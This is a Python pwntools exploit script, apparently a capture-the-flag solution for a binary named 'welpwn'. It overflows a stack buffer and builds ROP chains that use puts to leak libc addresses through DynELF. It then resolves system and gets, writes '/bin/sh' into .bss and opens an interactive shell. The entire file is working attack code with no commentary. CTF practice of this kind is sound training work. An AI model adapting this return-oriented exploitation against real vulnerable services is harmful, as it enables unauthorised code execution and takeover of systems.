#!/usr/bin/python 
from pwn import *
p = process('welpwn')
#context.log_level = 'debug'
ppppr = 0x40089c
poprdi = 0x4008a3
main = 0x4007cd
puts_plt = 0x4005a0
bss = 0x601070

p.recvuntil("RCTF\n")
def leak(addr):
    rop = p64(poprdi) + p64(addr) + p64(puts_plt) + p64(main)
    payload = "A" * 24 + p64(ppppr) + rop
    p.sendline(payload)
    p.recv(27)
    tmp = p.recv()
    data = tmp.split("\nWelcome")[0]
    if len(data):
        return data
    else:
        return '\x00'

d = DynELF(leak, elf=ELF('welpwn'))
system = d.lookup('system', 'libc')
log.info("system addr = " + hex(system))
gets = d.lookup('gets', 'libc')
log.info("gets addr = " + hex(gets))

# gets(bss); system(bss);
rop = p64(poprdi) + p64(bss) + p64(gets) + p64(poprdi) + p64(bss) + p64(system) + p64(0xdeadbeef)
payload = "A"*24 + p64(ppppr) + rop
p.sendline(payload)
sleep(1)
p.sendline('/bin/sh\0')

p.interactive()

